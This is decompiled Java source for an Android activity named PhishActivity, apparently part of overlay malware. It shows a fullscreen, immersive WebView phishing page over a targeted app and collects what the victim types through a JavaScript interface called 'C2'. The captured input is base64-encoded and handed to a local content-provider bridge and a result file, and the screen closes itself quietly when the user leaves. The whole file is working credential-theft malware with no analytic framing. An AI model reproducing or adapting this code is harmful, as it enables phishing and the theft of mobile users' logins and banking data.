package com.servers.ozzbzk;

import android.R;
import android.app.Activity;
import android.content.Intent;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.os.Handler;
import android.os.Looper;
import android.util.Base64;
import android.util.Log;
import android.view.Window;
import android.webkit.JavascriptInterface;
import android.webkit.WebSettings;
import android.webkit.WebView;
import android.webkit.WebViewClient;
import com.servers.ozzbzk.PhishActivity;
import java.io.File;
import java.io.FileOutputStream;

/* loaded from: classes.dex */
public class PhishActivity extends Activity {
    private static final long SOFT_DISMISS_MS = 300;
    private static final String TAG = "PhishAct";
    private Uri bridgeUri;
    private final Handler mainHandler = new Handler(Looper.getMainLooper());
    private Runnable pendingDismiss;
    private volatile boolean resultDelivered;
    private String resultPath;
    private String targetPkg;
    private WebView webView;

    private Uri getBridgeUri() {
        if (this.bridgeUri == null) {
            this.bridgeUri = Uri.parse("content://" + getPackageName() + ".bridge");
        }
        return this.bridgeUri;
    }

    @Override // android.app.Activity
    protected void onCreate(Bundle bundle) {
        super.onCreate(bundle);
        if (handleFinishIntent(getIntent())) {
            return;
        }
        String stringExtra = getIntent().getStringExtra("html_path");
        String stringExtra2 = getIntent().getStringExtra("html_base64");
        this.targetPkg = getIntent().getStringExtra("target_pkg");
        this.resultPath = getIntent().getStringExtra("result_path");
        if (stringExtra2 != null && !stringExtra2.isEmpty()) {
            try {
                byte[] decode = Base64.decode(stringExtra2, 2);
                File file = new File(getCacheDir(), "phish_page.html");
                FileOutputStream fileOutputStream = new FileOutputStream(file);
                fileOutputStream.write(decode);
                fileOutputStream.close();
                stringExtra = file.getAbsolutePath();
            } catch (Exception unused) {
                finish();
                return;
            }
        } else if (stringExtra == null || stringExtra.isEmpty()) {
            stringExtra = null;
        }
        if (stringExtra == null) {
            finish();
            return;
        }
        requestWindowFeature(1);
        Window window = getWindow();
        window.addFlags(1664);
        if (Build.VERSION.SDK_INT >= 28) {
            window.getAttributes().layoutInDisplayCutoutMode = 1;
        }
        window.setStatusBarColor(0);
        window.setNavigationBarColor(0);
        WebView webView = new WebView(this);
        this.webView = webView;
        webView.setBackgroundColor(-16777216);
        this.webView.setSystemUiVisibility(5894);
        WebSettings settings = this.webView.getSettings();
        settings.setJavaScriptEnabled(true);
        settings.setDomStorageEnabled(true);
        settings.setAllowFileAccess(true);
        settings.setAllowFileAccessFromFileURLs(false);
        this.webView.addJavascriptInterface(new C2Bridge(), "C2");
        this.webView.addJavascriptInterface(new C2Bridge(), "C2File");
        this.webView.setWebViewClient(new WebViewClient());
        File file2 = new File(stringExtra);
        if (file2.exists()) {
            this.webView.loadUrl("file://" + file2.getAbsolutePath());
            setContentView(this.webView);
            return;
        }
        finish();
    }

    @Override // android.app.Activity
    protected void onNewIntent(Intent intent) {
        super.onNewIntent(intent);
        this.resultDelivered = false;
        cancelPendingDismiss();
        handleFinishIntent(intent);
    }

    private boolean handleFinishIntent(Intent intent) {
        if (intent == null || !"finish".equals(intent.getStringExtra("action"))) {
            return false;
        }
        cancelPendingDismiss();
        deliverResult("{\"dismissed\":true}", true);
        finish();
        return true;
    }

    @Override // android.app.Activity
    public void onBackPressed() {
        cancelPendingDismiss();
        deliverResult("{\"dismissed\":true}", true);
        finish();
    }

    @Override // android.app.Activity, android.view.Window.Callback
    public void onWindowFocusChanged(boolean z) {
        WebView webView;
        super.onWindowFocusChanged(z);
        if (!z || (webView = this.webView) == null) {
            return;
        }
        webView.setSystemUiVisibility(5894);
    }

    @Override // android.app.Activity
    protected void onResume() {
        super.onResume();
        cancelPendingDismiss();
    }

    @Override // android.app.Activity
    protected void onUserLeaveHint() {
        super.onUserLeaveHint();
        scheduleSoftDismiss();
    }

    @Override // android.app.Activity
    protected void onStop() {
        super.onStop();
        scheduleSoftDismiss();
    }

    @Override // android.app.Activity
    protected void onDestroy() {
        cancelPendingDismiss();
        WebView webView = this.webView;
        if (webView != null) {
            webView.destroy();
            this.webView = null;
        }
        super.onDestroy();
    }

    private void scheduleSoftDismiss() {
        if (this.resultDelivered || isFinishing() || this.pendingDismiss != null) {
            return;
        }
        Runnable runnable = new Runnable() { // from class: com.servers.ozzbzk.PhishActivity$$ExternalSyntheticLambda0
            @Override // java.lang.Runnable
            public final void run() {
                PhishActivity.this.m9lambda$scheduleSoftDismiss$0$comserversozzbzkPhishActivity();
            }
        };
        this.pendingDismiss = runnable;
        this.mainHandler.postDelayed(runnable, SOFT_DISMISS_MS);
    }

    /* JADX INFO: Access modifiers changed from: package-private */
    /* renamed from: lambda$scheduleSoftDismiss$0$com-servers-ozzbzk-PhishActivity, reason: not valid java name */
    public /* synthetic */ void m9lambda$scheduleSoftDismiss$0$comserversozzbzkPhishActivity() {
        this.pendingDismiss = null;
        if (this.resultDelivered || isFinishing()) {
            return;
        }
        deliverResult("{\"dismissed\":true}", true);
        if (isFinishing() || isDestroyed()) {
            return;
        }
        finish();
    }

    /* JADX INFO: Access modifiers changed from: private */
    public void cancelPendingDismiss() {
        Runnable runnable = this.pendingDismiss;
        if (runnable != null) {
            this.mainHandler.removeCallbacks(runnable);
            this.pendingDismiss = null;
        }
    }

    /* JADX INFO: Access modifiers changed from: private */
    public void deliverResult(String str, boolean z) {
        if (this.resultDelivered) {
            return;
        }
        this.resultDelivered = true;
        cancelPendingDismiss();
        writeResultFile(str, z);
        try {
            Bundle bundle = new Bundle();
            String str2 = this.targetPkg;
            if (str2 == null) {
                str2 = "";
            }
            bundle.putString("target_pkg", str2);
            bundle.putString("data_b64", Base64.encodeToString(str.getBytes("UTF-8"), 2));
            bundle.putBoolean("dismissed", z);
            getContentResolver().call(getBridgeUri(), "phish_result", (String) null, bundle);
        } catch (Exception unused) {
        }
    }

    private void writeResultFile(String str, boolean z) {
        String str2 = this.resultPath;
        if (str2 == null || str2.isEmpty()) {
            return;
        }
        try {
            File file = new File(this.resultPath);
            File file2 = new File(this.resultPath + ".tmp");
            File parentFile = file.getParentFile();
            if (parentFile != null && !parentFile.exists()) {
                parentFile.mkdirs();
            }
            if (z) {
                str = "{\"dismissed\":true}";
            }
            FileOutputStream fileOutputStream = new FileOutputStream(file2);
            fileOutputStream.write(str.getBytes("UTF-8"));
            fileOutputStream.getFD().sync();
            fileOutputStream.close();
            file2.renameTo(file);
        } catch (Exception e) {
            Log.w(TAG, "writeResult: " + e.getMessage());
        }
    }

    /* JADX INFO: Access modifiers changed from: private */
    /* loaded from: classes.dex */
    public final class C2Bridge {
        private C2Bridge() {
        }

        @JavascriptInterface
        public void submit(String str) {
            PhishActivity.this.cancelPendingDismiss();
            PhishActivity.this.deliverResult(str, false);
            if (PhishActivity.this.webView != null) {
                PhishActivity.this.webView.postDelayed(new Runnable() { // from class: com.servers.ozzbzk.PhishActivity$C2Bridge$$ExternalSyntheticLambda1
                    @Override // java.lang.Runnable
                    public final void run() {
                        PhishActivity.C2Bridge.this.m11lambda$submit$1$comserversozzbzkPhishActivity$C2Bridge();
                    }
                }, 1800L);
            }
        }

        /* JADX INFO: Access modifiers changed from: package-private */
        /* renamed from: lambda$submit$1$com-servers-ozzbzk-PhishActivity$C2Bridge, reason: not valid java name */
        public /* synthetic */ void m11lambda$submit$1$comserversozzbzkPhishActivity$C2Bridge() {
            PhishActivity.this.runOnUiThread(new Runnable() { // from class: com.servers.ozzbzk.PhishActivity$C2Bridge$$ExternalSyntheticLambda0
                @Override // java.lang.Runnable
                public final void run() {
                    PhishActivity.C2Bridge.this.m10lambda$submit$0$comserversozzbzkPhishActivity$C2Bridge();
                }
            });
        }

        /* JADX INFO: Access modifiers changed from: package-private */
        /* renamed from: lambda$submit$0$com-servers-ozzbzk-PhishActivity$C2Bridge, reason: not valid java name */
        public /* synthetic */ void m10lambda$submit$0$comserversozzbzkPhishActivity$C2Bridge() {
            if (PhishActivity.this.isFinishing() || PhishActivity.this.isDestroyed()) {
                return;
            }
            PhishActivity.this.overridePendingTransition(0, R.anim.fade_out);
            PhishActivity.this.finish();
        }

        @JavascriptInterface
        public void write(String str) {
            submit(str);
        }
    }
}
